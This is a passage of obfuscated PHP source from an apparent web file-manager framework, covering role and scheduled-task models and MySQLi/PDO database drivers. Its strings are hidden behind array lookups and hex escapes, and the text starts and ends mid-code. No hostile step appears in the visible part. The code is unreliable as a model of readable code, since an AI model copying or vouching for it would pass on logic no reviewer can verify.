$•¦•¼[$íÖ—ûÂ…[32]]; if ($this->findByName($¼§´¦ŠØ)) { return !1; } $ò·Šô„ò = array($íÖ—ûÂ…[458] => $¼§´¦ŠØ, $íÖ—ûÂ…[1865] => $íÖ—ûÂ…[12], $íÖ—ûÂ…[1861] => $íÖ—ûÂ…[1869], $íÖ—ûÂ…[2297] => 1, $íÖ—ûÂ…[1864] => 0, $íÖ—ûÂ…[2298] => 0, $íÖ—ûÂ…[1863] => $this->getSort()); $•¦•¼ = array_merge($ò·Šô„ò, $•¦•¼); $this->filterAuth($•¦•¼[$íÖ—ûÂ…[451]]); return parent::insert($•¦•¼); } private function getSort() { $îº¯è =& $_SERVER[¹òÍ›æş]; $à˜†ÄÂ¤ = parent::listData(); $œƒ»¥ûÕ = array_to_keyvalue($à˜†ÄÂ¤, $îº¯è[12], $îº¯è[1883]); return empty($œƒ»¥ûÕ) ? 0 : max($œƒ»¥ûÕ) + 1; } private function filterAuth(&$±ó¥ºÉÒ) { $µÄöº† =& $_SERVER[¹òÍ›æş]; $Ò¬Ô‡ò× = array(); $Ä»ìÍÒ = array_filter(explode($µÄöº†[50], $±ó¥ºÉÒ)); foreach ($Ä»ìÍÒ as $±ó¥ºÉÒ) { $Ò‰¸»à = explode($µÄöº†[10], $±ó¥ºÉÒ); if ($Ò‰¸»à[0] == $µÄöº†[2299] && $Ò‰¸»à[1] != $µÄöº†[1217]) { $Êû¯üŒè = $Ò‰¸»à[0] . $µÄöº†[10] . $Ò‰¸»à[1] . $µÄöº†[2300]; if (!in_array($Êû¯üŒè, $Ä»ìÍÒ)) { $Ò¬Ô‡ò×[] = $Êû¯üŒè; } } $Ò¬Ô‡ò×[] = $±ó¥ºÉÒ; } $±ó¥ºÉÒ = implode($µÄöº†[50], $Ò¬Ô‡ò×); } public function findRoleDefault() { $”˜˜ç›” =& $_SERVER[¹òÍ›æş]; $¦Ì‘æğ = parent::listData(); $ÇöãÖİ = !1; foreach ($¦Ì‘æğ as $¾‹óæœµ) { if (!$¾‹óæœµ || $¾‹óæœµ[$”˜˜ç›”[1881]] == $”˜˜ç›”[208] || $¾‹óæœµ[$”˜˜ç›”[2061]] == 1) { continue; } if (strstr($¾‹óæœµ[$”˜˜ç›”[451]], $”˜˜ç›”[2301])) { continue; } if (!strstr($¾‹óæœµ[$”˜˜ç›”[451]], $”˜˜ç›”[2302])) { continue; } if (!$ÇöãÖİ) { $ÇöãÖİ = $¾‹óæœµ; continue; } $ÒŸâù§œ = explode($”˜˜ç›”[50], $ÇöãÖİ[$”˜˜ç›”[451]]); $ËÂÏÄÙÂ = explode($”˜˜ç›”[50], $¾‹óæœµ[$”˜˜ç›”[451]]); if (count($ÒŸâù§œ) > count($ËÂÏÄÙÂ)) { $ÇöãÖİ = $¾‹óæœµ; } } return $ÇöãÖİ ? $ÇöãÖİ[$”˜˜ç›”[437]] : $”˜˜ç›”[12]; } public function sort($‹áÑ¦¨, $¤‰¡‡Ôö) { return parent::update($‹áÑ¦¨, $¤‰¡‡Ôö); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\164\x61\x73\153\x4c\151\163\164"; public $field = array("\156\x61\x6d\145", "\164\x79\x70\145", "\x65\166\x65\x6e\x74", "\x74\x69\x6d\x65", "\144\x65\x73\143", "\163\171\163\164\145\x6d", "\x65\x6e\x61\x62\x6c\x65", "\154\141\x73\x74\122\165\156", "\x73\x6f\x72\x74"); public function listData($ Ô‰Æ£ = false, $ÅëÜ¸˜è = "\x73\x6f\162\x74", $ç§ğÚ¤ = false) { return parent::listData($ Ô‰Æ£, $ÅëÜ¸˜è, $ç§ğÚ¤); } public function add($ ¡Ø°à·) { $†ï±€®÷ =& $_SERVER[¹òÍ›æş]; $ñºÔ”»ğ = $this->findByName($ ¡Ø°à·[$†ï±€®÷[32]]); if ($ñºÔ”»ğ) { return !1; } $ ¡Ø°à·[$†ï±€®÷[1629]] = 0; $ ¡Ø°à·[$†ï±€®÷[1883]] = $this->getSort(); return parent::insert($ ¡Ø°à·); } private function getSort() { $Úïä¯¯í =& $_SERVER[¹òÍ›æş]; $Ÿà¸Çı÷ = parent::listData(); $€Ğ²«ùƒ = array_to_keyvalue($Ÿà¸Çı÷, $Úïä¯¯í[12], $Úïä¯¯í[1883]); return empty($€Ğ²«ùƒ) ? 0 : max($€Ğ²«ùƒ) + 1; } public function update($–üÚƒø®, $‹›˜¾è­) { $Ì¥®æè¿ =& $_SERVER[¹òÍ›æş]; $¼Å­ƒ¸À = $this->listData($–üÚƒø®); $¦³•Ò„ = $this->findByName($‹›˜¾è­[$Ì¥®æè¿[32]]); if (!$¼Å­ƒ¸À || $¦³•Ò„ && $¦³•Ò„[$Ì¥®æè¿[437]] != $¼Å­ƒ¸À[$Ì¥®æè¿[437]]) { return !1; } return parent::update($–üÚƒø®, $‹›˜¾è­); } public function remove($š¶ÊÚ, $‘óøˆ”È = false) { $”ãƒÑÖ =& $_SERVER[¹òÍ›æş]; $†õã…Š€ = $this->listData($š¶ÊÚ); if (!$†õã…Š€) { return; } if (!$‘óøˆ”È && $†õã…Š€[$”ãƒÑÖ[1314]] == $”ãƒÑÖ[98]) { return !1; } return parent::remove($š¶ÊÚ); } public function enable($«åÈ¦ÀÒ, $æÆáËé) { return $this->update($«åÈ¦ÀÒ, array($_SERVER[¹òÍ›æş][2291] => $æÆáËé)); } public function run($ïçÇû¿Œ) { return $this->update($ïçÇû¿Œ, array($_SERVER[¹òÍ›æş][2303] => time())); } } goto Fç¸çÉ¬Æƒ; F‰ƒŸ³‚Œì: class DbMysqli extends Db { public function __construct($İë±›Á´ = '') { $¨–üßä =& $_SERVER[¹òÍ›æş]; if (!extension_loaded($¨–üßä[939])) { think_exception(think_lang($¨–üßä[14]) . $¨–üßä[940]); } if (!empty($İë±›Á´)) { $this->config = $İë±›Á´; if (empty($this->config[$¨–üßä[17]])) { $this->config[$¨–üßä[17]] = $¨–üßä[12]; } } } public function connect($ìØåüœã = '', $”–¿®Ñß = 0) { $•™šÔœ =& $_SERVER[¹òÍ›æş]; if (!isset($this->linkID[$”–¿®Ñß])) { if (empty($ìØåüœã)) { $ìØåüœã = $this->config; } $this->linkID[$”–¿®Ñß] = new mysqli($ìØåüœã[$•™šÔœ[913]], $ìØåüœã[$•™šÔœ[915]], $ìØåüœã[$•™šÔœ[916]], $ìØåüœã[$•™šÔœ[21]], $ìØåüœã[$•™šÔœ[914]] ? intval($ìØåüœã[$•™šÔœ[914]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ß¸³”÷‹ = $this->linkID[$”–¿®Ñß]->server_version; $this->linkID[$”–¿®Ñß]->query($•™šÔœ[917] . think_config($•™šÔœ[918]) . $•™šÔœ[68]); if ($ß¸³”÷‹ > $•™šÔœ[919]) { $this->linkID[$”–¿®Ñß]->query($•™šÔœ[920]); } $this->connected = !0; if (1 != think_config($•™šÔœ[22])) { unset($this->config); } } return $this->linkID[$”–¿®Ñß]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($˜„ÔåäŒ) { $â‘³¬Ê =& $_SERVER[¹òÍ›æş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $˜„ÔåäŒ; if ($this->queryID) { $this->free(); } think_action_status($â‘³¬Ê[23], 1); think_status($â‘³¬Ê[24]); $this->queryID = $this->_linkID->query($˜„ÔåäŒ); if ($this->_linkID->more_results()) { while (($Ö¨ûµí‰ = $this->_linkID->next_result()) != NULL) { $Ö¨ûµí‰->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($±“£ì) { $é ‘ñÂ™ =& $_SERVER[¹òÍ›æş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $±“£ì; if ($this->queryID) { $this->free(); } think_action_status($é ‘ñÂ™[25], 1); think_status($é ‘ñÂ™[24]); $€ Ÿ–ĞÀ = $this->_linkID->query($±“£ì); $this->debug(); if (!1 === $€ Ÿ–ĞÀ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÚÈ°òÄ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÚÈ°òÄ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $î«Ëµ× = $this->_linkID->rollback(); $this->transTimes = 0; if (!$î«Ëµ×) { $this->error(); return !1; } } return !0; } private function getAll() { $…Ãì©‘À = array(); if ($this->numRows > 0) { for ($Ÿë…èæ = 0; $Ÿë…èæ < $this->numRows; $Ÿë…èæ++) { $…Ãì©‘À[$Ÿë…èæ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $…Ãì©‘À; } public function getFields($ìß¶¶Ì) { $ÏÚÉÖŞ” =& $_SERVER[¹òÍ›æş]; $×±Ñë‹ = $this->query($ÏÚÉÖŞ”[924] . $this->parseKey($ìß¶¶Ì)); $¼‡ì·¼ğ = array(); if ($×±Ñë‹) { foreach ($×±Ñë‹ as $É¢ÁëÎÙ => $œêÁ­Œ) { $¼‡ì·¼ğ[$œêÁ­Œ[$ÏÚÉÖŞ”[31]]] = array($ÏÚÉÖŞ”[32] => $œêÁ­Œ[$ÏÚÉÖŞ”[31]], $ÏÚÉÖŞ”[33] => $œêÁ­Œ[$ÏÚÉÖŞ”[34]], $ÏÚÉÖŞ”[35] => (bool) ($œêÁ­Œ[$ÏÚÉÖŞ”[36]] === $ÏÚÉÖŞ”[12]), $ÏÚÉÖŞ”[37] => $œêÁ­Œ[$ÏÚÉÖŞ”[38]], $ÏÚÉÖŞ”[39] => strtolower($œêÁ­Œ[$ÏÚÉÖŞ”[40]]) == $ÏÚÉÖŞ”[41], $ÏÚÉÖŞ”[42] => strtolower($œêÁ­Œ[$ÏÚÉÖŞ”[43]]) == $ÏÚÉÖŞ”[44]); } } return $¼‡ì·¼ğ; } public function getTables($õúç¤ = '') { $ş¼ìõ½µ =& $_SERVER[¹òÍ›æş]; $ÊöõÉÌ = !empty($õúç¤) ? $ş¼ìõ½µ[926] . $õúç¤ . $ş¼ìõ½µ[927] : $ş¼ìõ½µ[928]; $³İ€ã¿¼ = $this->query($ÊöõÉÌ); $šë‘ªÅÀ = array(); if ($³İ€ã¿¼) { foreach ($³İ€ã¿¼ as $¶øóŸ©ƒ => $îÙ«´‹Ò) { $šë‘ªÅÀ[$¶øóŸ©ƒ] = current($îÙ«´‹Ò); } } return $šë‘ªÅÀ; } public function replace($¥‰°ôçÔ, $±Ìú¶èÜ = array()) { $¾¤ÖÃ×‰ =& $_SERVER[¹òÍ›æş]; foreach ($¥‰°ôçÔ as $¸Ìı‹¢­ => $è•ÂÃ‘½) { $õñ—ï¿ = $this->parseValue($è•ÂÃ‘½); if (is_scalar($õñ—ï¿)) { $·µìíú›[] = $õñ—ï¿; $©ÈÂ´•‘[] = $this->parseKey($¸Ìı‹¢­); } } $”î§¦ØÆ = $¾¤ÖÃ×‰[929] . $this->parseTable($±Ìú¶èÜ[$¾¤ÖÃ×‰[317]]) . $¾¤ÖÃ×‰[930] . implode($¾¤ÖÃ×‰[50], $©ÈÂ´•‘) . $¾¤ÖÃ×‰[931] . implode($¾¤ÖÃ×‰[50], $·µìíú›) . $¾¤ÖÃ×‰[932]; return $this->execute($”î§¦ØÆ); } public function insertAll($Ô‚“ô•³, $Ô–²íÖ = array(), $ğ‹ºÕ‰ = false) { $”¬‚‹àÖ =& $_SERVER[¹òÍ›æş]; if (!is_array($Ô‚“ô•³[0])) { return !1; } $ÊÕò›¦Û = array_keys($Ô‚“ô•³[0]); $ëÈÑ™¿ò = array(); foreach ($Ô‚“ô•³ as $Ç›Õ¬) { $ÚÃÎ•„· = array(); foreach ($Ç›Õ¬ as $ÒÙºˆ‘‹ => $”›üá×) { $”›üá× = $this->parseValue($”›üá×); if (is_scalar($”›üá×)) { $ÚÃÎ•„·[] = $”›üá×; } } $ëÈÑ™¿ò[] = $”¬‚‹àÖ[298] . implode($”¬‚‹àÖ[50], $ÚÃÎ•„·) . $”¬‚‹àÖ[932]; } array_walk($ÊÕò›¦Û, array($this, $”¬‚‹àÖ[933])); $ôéÍ¿Ûá = $ğ‹ºÕ‰ ? $”¬‚‹àÖ[934] : $”¬‚‹àÖ[935]; $áÁ‚ƒ = $ôéÍ¿Ûá . $”¬‚‹àÖ[936] . $this->parseTable($Ô–²íÖ[$”¬‚‹àÖ[317]]) . $”¬‚‹àÖ[930] . implode($”¬‚‹àÖ[50], $ÊÕò›¦Û) . $”¬‚‹àÖ[937] . implode($”¬‚‹àÖ[50], $ëÈÑ™¿ò); return $this->execute($áÁ‚ƒ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‚Ğˆ»² =& $_SERVER[¹òÍ›æş]; $this->error = $this->_linkID->errno . $‚Ğˆ»²[4] . $this->_linkID->error; if ($‚Ğˆ»²[12] != $this->queryStr) { $this->error .= LNG($‚Ğˆ»²[48]) . $this->queryStr; } think_trace($this->error, $‚Ğˆ»²[12], $‚Ğˆ»²[49]); return $this->error; } public function escapeString($Ö—’ÔÔ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Ö—’ÔÔ); } else { return addslashes($Ö—’ÔÔ); } } public function parseKey(&$Ãú®æØ×, $øØïô§ë = true) { $¼ğÉ‘öÔ =& $_SERVER[¹òÍ›æş]; if ($øØïô§ë) { $Ãú®æØ× = $this->parseKeyCheck($Ãú®æØ×); } if ($Ãú®æØ× != $¼ğÉ‘öÔ[199] && !preg_match($¼ğÉ‘öÔ[938], $Ãú®æØ×)) { $Ãú®æØ× = $¼ğÉ‘öÔ[423] . trim($Ãú®æØ×, $¼ğÉ‘öÔ[423]) . $¼ğÉ‘öÔ[423]; } return $Ãú®æØ×; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ïÓâ«ù‰ = '') { $¿¸Ÿ¤ÎÒ =& $_SERVER[¹òÍ›æş]; if (!class_exists($¿¸Ÿ¤ÎÒ[941])) { think_exception(think_lang($¿¸Ÿ¤ÎÒ[14]) . $¿¸Ÿ¤ÎÒ[942]); } if (!empty($ïÓâ«ù‰)) { $this->config = $ïÓâ«ù‰; if (empty($this->config[$¿¸Ÿ¤ÎÒ[17]])) { $this->config[$¿¸Ÿ¤ÎÒ[17]] = array(); } } } public function connect($À¹ÛÔ = '', $»ÎõÖÁ³ = 0) { $Ñ¹‡‘ºÓ =& $_SERVER[¹òÍ›æş]; if (!isset($this->linkID[$»ÎõÖÁ³])) { if (empty($À¹ÛÔ)) { $À¹ÛÔ = $this->config; } $ı°×Ğ¦Ü = !empty($À¹ÛÔ[$Ñ¹‡‘ºÓ[17]][$Ñ¹‡‘ºÓ[18]]) ? $À¹ÛÔ[$Ñ¹‡‘ºÓ[17]][$Ñ¹‡‘ºÓ[18]] : $this->pconnect; if ($ı°×Ğ¦Ü) { $À¹ÛÔ[$Ñ¹‡‘ºÓ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$»ÎõÖÁ³] = new PDO($À¹ÛÔ[$Ñ¹‡‘ºÓ[943]], $À¹ÛÔ[$Ñ¹‡‘ºÓ[915]], $À¹ÛÔ[$Ñ¹‡‘ºÓ[916]], $À¹ÛÔ[$Ñ¹‡‘ºÓ[17]]); } catch (PDOException $ÜÈ¤Õê) { think_exception($ÜÈ¤Õê->getMessage()); } $this->dbType = $this->_getDsnType($À¹ÛÔ[$Ñ¹‡‘ºÓ[943]]); if (in_array($this->dbType, array($Ñ¹‡‘ºÓ[944], $Ñ¹‡‘ºÓ[945], $Ñ¹‡‘ºÓ[946], $Ñ¹‡‘ºÓ[947]))) { think_exception($Ñ¹‡‘ºÓ[948] . $this->dbType . $Ñ¹‡‘ºÓ[949] . $this->dbType . $Ñ¹‡‘ºÓ[950]); } if (!$this->linkID[$»ÎõÖÁ³]) { think_exception($Ñ¹‡‘ºÓ[951]); } try { $this->linkID[$»ÎõÖÁ³]->exec($Ñ¹‡‘ºÓ[952] . think_config($Ñ¹‡‘ºÓ[918])); } catch (Exception $ÜÈ¤Õê) { } $this->connected = !0; if (1 != think_config($Ñ¹‡‘ºÓ[22])) { unset($this->config); } } return $this->linkID[$»ÎõÖÁ³]; } public function free() { $this->PDOStatement = null; } public function query($Ï«Ë²ñÈ, $©ö¬ü¨§ = array()) { $Ô­ÔÉ» =& $_SERVER[¹òÍ›æş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ï«Ë²ñÈ; if (!empty($©ö¬ü¨§)) { $this->queryStr .= $Ô­ÔÉ»[953] . print_r($©ö¬ü¨§, !0) . $Ô­ÔÉ»[954]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ô­ÔÉ»[23], 1); think_status($Ô­ÔÉ»[24]); $this->PDOStatement = $this->_linkID->prepare($Ï«Ë²ñÈ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¤¦ŠãÏ¥ = $this->PDOStatement->execute($©ö¬ü¨§); $this->debug(); if (!1 === $¤¦ŠãÏ¥) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($é×›¶ªó, $äº‘»™½ = array()) { $½ê›ÔÎĞ =& $_SERVER[¹òÍ›æş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $é×›¶ªó; if (!empty($äº‘»™½)) { $this->queryStr .= $½ê›ÔÎĞ[953] . print_r($äº‘»™½, !0) . $½ê›ÔÎĞ[954]; } $¡Ï†È˜ = !1; if ($this->dbType == $½ê›ÔÎĞ[947]) { if (preg_match($½ê›ÔÎĞ[955], $this->queryStr, $û«Í“ø)) { $this->table = think_config($½ê›ÔÎĞ[956]) . str_ireplace(think_config($½ê›ÔÎĞ[957]), $½ê›ÔÎĞ[416], $û«Í“ø[2]); $¡Ï†È˜ = (bool) $this->query($½ê›ÔÎĞ[958] . strtoupper($this->table) . $½ê›ÔÎĞ[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($½ê›ÔÎĞ[25], 1); think_status($½ê›ÔÎĞ[24]); $this->PDOStatement = $this->_linkID->prepare($é×›¶ªó); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¸£Ñî = $this->PDOStatement->execute($äº‘»™½); $this->debug(); if (!1 === $¸£Ñî) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¡Ï†È˜ || preg_match($½ê›ÔÎĞ[959], $é×›¶ªó)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $µê³îù = $this->_linkID->commit(); $this->transTimes = 0; if (!$µê³îù) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ØÄÀ…‡  = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ØÄÀ…‡ ) { $this->error(); return !1; } } return !0; } private function getAll() { $ºÂî™ß” = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ºÂî™ß”); return $ºÂî™ß”; } public function getFields($ºÇ­õıò) { $Õè•¤œ¡ =& $_SERVER[¹òÍ›æş]; $this->initConnect(!0); if (think_config($Õè•¤œ¡[960])) { $Ã®‚çÈ = str_replace($Õè•¤œ¡[961], $ºÇ­õıò, think_config($Õè•¤œ¡[960])); } else { switch ($this->dbType) { case $Õè•¤œ¡[944]: case $Õè•¤œ¡[962]: $Ã®‚çÈ = "\x53\x45\114\x45\x43\124\x20\x20\40\x63\x6f\x6c\165\x6d\156\x5f\156\141\155\145\40\141\163\x20\x27\x4e\x61\x6d\x65\x27\x2c\x20\x20\40\144\x61\164\x61\x5f\164\171\160\145\40\x61\x73\40\47\x54\171\x70\145\x27\x2c\40\x20\40\143\x6f\x6c\165\155\156\x5f\x64\x65\x66\x61\165\x6c\x74\40\141\163\x20\47\x44\145\146\x61\165\x6c\164\x27\x2c\x20\x20\40\151\x73\x5f\x6e\165\x6c\x6c\x61\x62\x6c\x65\x20\141\x73\x20\47\x4e\165\x6c\154\47\xa\11\x9\106\x52\117\115\11\x69\156\146\x6f\162\x6d\141\164\x69\x6f\156\137\x73\143\150\x65\x6d\141\x2e\x74\x61\x62\154\145\163\x20\x41\123\x20\x74\12\11\11\x4a\x4f\x49\x4e\x9\151\156\146\157\162\x6d\x61\x74\151\x6f\x6e\137\x73\143\150\145\155\x61\x2e\x63\157\x6c\x75\155\156\x73\40\x41\123\40\x63\xa\x9\x9\117\x4e\x20\40\x74\x2e\164\x61\x62\x6c\x65\137\143\x61\164\141\154\157\147\x20\75\40\x63\56\164\141\x62\x6c\145\x5f\143\x61\164\x61\154\157\x67\12\11\11\x41\x4e\104\x20\164\x2e\x74\x61\x62\x6c\145\x5f\163\143\150\x65\x6d\141\40\x3d\40\143\56\x74\x61\142\x6c\145\137\x73\143\x68\x65\155\141\xa\11\x9\x41\x4e\x44\40\164\56\x74\141\x62\x6c\x65\x5f\x6e\141\x6d\x65\x20\x3d\40\143\x2e\164\141\142\154\145\137\x6e\x61\x6d\145\xa\11\x9\127\110\x45\122\x45\40\x20\40\x74\x2e\164\x61\x62\x6c\x65\x5f\x6e\141\x6d\x65\x20\75\x20\47{$ºÇ­õıò}\x27"; break; case $Õè•¤œ¡[963]: $Ã®‚çÈ = $Õè•¤œ¡[964] . $ºÇ­õıò . $Õè•¤œ¡[965]; break; case $Õè•¤œ¡[945]: case $Õè•¤œ¡[947]: $Ã®‚çÈ = $Õè•¤œ¡[966] . $Õè•¤œ¡[967] . $Õè•¤œ¡[968] . strtoupper($ºÇ­õıò) . $Õè•¤œ¡[969] . strtoupper($ºÇ­õıò) . $Õè•¤œ¡[970]; break; case $Õè•¤œ¡[971]: $Ã®‚çÈ = $Õè•¤œ¡[972] . $ºÇ­õıò . $Õè•¤œ¡[973]; break; case $Õè•¤œ¡[946]: break; case $Õè•¤œ¡[974]: default: $Ã®‚çÈ = $Õè•¤œ¡[975] . ($this->dbType == $Õè•¤œ¡[974] ? "\140{$ºÇ­õıò}\140" : $ºÇ­õıò); } } $›ü§‘Ü = $this->query($Ã®‚çÈ); $‘¥©ã = array(); if ($›ü§‘Ü) { foreach ($›ü§‘Ü as $š½“†Õº => $üÂì‚÷ü) { $üÂì‚÷ü = array_change_key_case($üÂì‚÷ü); $üÂì‚÷ü[$Õè•¤œ¡[32]] = isset($üÂì‚÷ü[$Õè•¤œ¡[32]]) ? $üÂì‚÷ü[$Õè•¤œ¡[32]] : $Õè•¤œ¡[416]; $üÂì‚÷ü[$Õè•¤œ¡[33]] = isset($üÂì‚÷ü[$Õè•¤œ¡[33]]) ? $üÂì‚÷ü[$Õè•¤œ¡[33]] : $Õè•¤œ¡[416]; $í‰Ú˜Ôå = isset($üÂì‚÷ü[$Õè•¤œ¡[311]]) ? $üÂì‚÷ü[$Õè•¤œ¡[311]] : $üÂì‚÷ü[$Õè•¤œ¡[32]]; $‘¥©ã[$í‰Ú˜Ôå] = array($Õè•¤œ¡[32] => $í‰Ú˜Ôå, $Õè•¤œ¡[33] => $üÂì‚÷ü[$Õè•¤œ¡[33]], $Õè•¤œ¡[35] => (bool) (isset($üÂì‚÷ü[$Õè•¤œ¡[113]]) && $üÂì‚÷ü[$Õè•¤œ¡[113]] === $Õè•¤œ¡[12] || isset($üÂì‚÷ü[$Õè•¤œ¡[35]]) && $üÂì‚÷ü[$Õè•¤œ¡[35]] === $Õè•¤œ¡[12]), $Õè•¤œ¡[37] => isset($üÂì‚÷ü[$Õè•¤œ¡[37]]) ? $üÂì‚÷ü[$Õè•¤œ¡[37]] : (isset($üÂì‚÷ü[$Õè•¤œ¡[66]]) ? $üÂì‚÷ü[$Õè•¤œ¡[66]] : $Õè•¤œ¡[416]), $Õè•¤œ¡[39] => isset($üÂì‚÷ü[$Õè•¤œ¡[104]]) ? strtolower($üÂì‚÷ü[$Õè•¤œ¡[104]]) == $Õè•¤œ¡[41] : (isset($üÂì‚÷ü[$Õè•¤œ¡[67]]) ? $üÂì‚÷ü[$Õè•¤œ¡[67]] : !1), $Õè•¤œ¡[42] => isset($üÂì‚÷ü[$Õè•¤œ¡[976]]) ? strtolower($üÂì‚÷ü[$Õè•¤œ¡[976]]) == $Õè•¤œ¡[44] : (isset($üÂì‚÷ü[$Õè•¤œ¡[104]]) ? $üÂì‚÷ü[$Õè•¤œ¡[104]] : !1)); } } return $‘¥©ã; } public function getTables($¸³©´¾² = '') { $¬ß¡—ÇÃ =& $_SERVER[¹òÍ›æş]; if (think_config($¬ß¡—ÇÃ[977])) { $Î–óÔŒÑ = str_replace($¬ß¡—ÇÃ[978], $¸³©´¾², think_config($¬ß¡—ÇÃ[977])); } else { switch ($this->dbType) { case $¬ß¡—ÇÃ[945]: case $¬ß¡—ÇÃ[947]: $Î–óÔŒÑ = $¬ß¡—ÇÃ[979]; break; case $¬ß¡—ÇÃ[944]: case $¬ß¡—ÇÃ[962]: $Î–óÔŒÑ = $¬ß¡—ÇÃ[980]; break; case $¬ß¡—ÇÃ[971]: $Î–óÔŒÑ = $¬ß¡—ÇÃ[981]; break; case $¬ß¡—ÇÃ[946]: think_exception(think_lang($¬ß¡—ÇÃ[982]) . $¬ß¡—ÇÃ[983]); break; case $¬ß¡—ÇÃ[963]: $Î–óÔŒÑ = $¬ß¡—ÇÃ[45] . $¬ß¡—ÇÃ[46] . $¬ß¡—ÇÃ[47]; break; case $¬ß¡—ÇÃ[974]: default: if (!empty($¸³©´¾²)) { $Î–óÔŒÑ = $¬ß¡—ÇÃ[926] . $¸³©´¾² . $¬ß¡—ÇÃ[927]; } else { $Î–óÔŒÑ = $¬ß¡—ÇÃ[928]; } } } $ò¹ÆŞ§À = $this->query($Î–óÔŒÑ); $ú²…¹ = array(); foreach ($ò¹ÆŞ§À as $”’›ãˆ => $Ö¶éÑÈÆ) { $ú²…¹[$”’›ãˆ] = current($Ö¶éÑÈÆ); } return $ú²…¹; } protected function parseLimit($Á÷ş–­É) { $Ìˆ›²—Û =& $_SERVER[¹òÍ›æş]; $Ş¼ºŠ¿’ = $Ìˆ›²—Û[12]; if (!empty($Á÷ş–­É)) { switch ($this->dbType) { case $Ìˆ›²—Û[971]: case $Ìˆ›²—Û[963]: $Á÷ş–­É = explode($Ìˆ›²—Û[50], $Á÷ş–­É); if (count($Á÷ş–­É) > 1) { $Ş¼ºŠ¿’ .= $Ìˆ›²—Û[51] . $Á÷ş–­É[1] . $Ìˆ›²—Û[52] . $Á÷ş–­É[0] . $Ìˆ›²—Û[53]; } else { $Ş¼ºŠ¿’ .= $Ìˆ›²—Û[51] . $Á÷ş–­É[0] . $Ìˆ›²—Û[53]; } break; case $Ìˆ›²—Û[944]: case $Ìˆ›²—Û[962]: break; case $Ìˆ›²—Û[946]: break; case $Ìˆ›²—Û[945]: case $Ìˆ›²—Û[947]: break; case $Ìˆ›²—Û[974]: default: $Ş¼ºŠ¿’ .= $Ìˆ›²—Û[51] . $Á÷ş–­É . $Ìˆ›²—Û[53]; } } return $Ş¼ºŠ¿’; } public function parseKey(&$‘«óö÷, $ó×›¸Š‚ = true) { $àñ¨òÚı =& $_SERVER[¹òÍ›æş]; if ($ó×›¸Š‚) { $‘«óö÷ = $this->parseKeyCheck($‘«óö÷); } if ($this->dbType == $àñ¨òÚı[974]) { if ($‘«óö÷ != $àñ¨òÚı[199] && !preg_match($àñ¨òÚı[938], $‘«óö÷)) { $‘«óö÷ = $àñ¨òÚı[423] . trim($‘«óö÷, $àñ¨òÚı[423]) . $àñ¨òÚı[423]; } return $‘«óö÷; } else { return parent::parseKey($‘«óö÷, $ó×›¸Š‚); } } public function close() { $this->_linkID = null; } public function error() { $ºÑÄ³­Ş =& $_SERVER[¹òÍ›æş]; if ($this->PDOStatement) { $øı‹™Ö = $this->PDOStatement->errorInfo(); $this->error = $øı‹™Ö[1] . $ºÑÄ³­Ş[4] . $øı‹™Ö[2]; } else { $this->error = $ºÑÄ³­Ş[12]; } if ($ºÑÄ³­Ş[12] != $this->queryStr) { $this->error .= LNG($ºÑÄ³­Ş[48]) . $this->queryStr; } think_trace($this->error, $ºÑÄ³­Ş[12], $ºÑÄ³­Ş[49]); return $this->error; } public function escapeString($ÇÌ¹€Œ§) { $üÓ¹Ä²ş =& $_SERVER[¹òÍ›æş]; switch ($this->dbType) { case $üÓ¹Ä²ş[971]: case $üÓ¹Ä²ş[944]: case $üÓ¹Ä²ş[962]: case $üÓ¹Ä²ş[974]: return addslashes($ÇÌ¹€Œ§); case $üÓ¹Ä²ş[946]: case $üÓ¹Ä²ş[963]: case $üÓ¹Ä²ş[945]: case $üÓ¹Ä²ş[947]: return str_ireplace($üÓ¹Ä²ş[68], $üÓ¹Ä²ş[69], $ÇÌ¹€Œ§); } } protected function parseValue($›ÊşŞŒÁ) { $‘â‰ô·½ =& $_SERVER[¹òÍ›æş]; if (is_string($›ÊşŞŒÁ)) { $­îšÅİ– = strpos($›ÊşŞŒÁ, $‘â‰ô·½[4]) === 0 && in_array($›ÊşŞŒÁ, array_keys($this->bind)); $›ÊşŞŒÁ = $­îšÅİ– ? $this->escapeString($›ÊşŞŒÁ) : $‘â‰ô·½[984] . $this->escapeString($›ÊşŞŒÁ) . $‘â‰ô·½[984]; } elseif 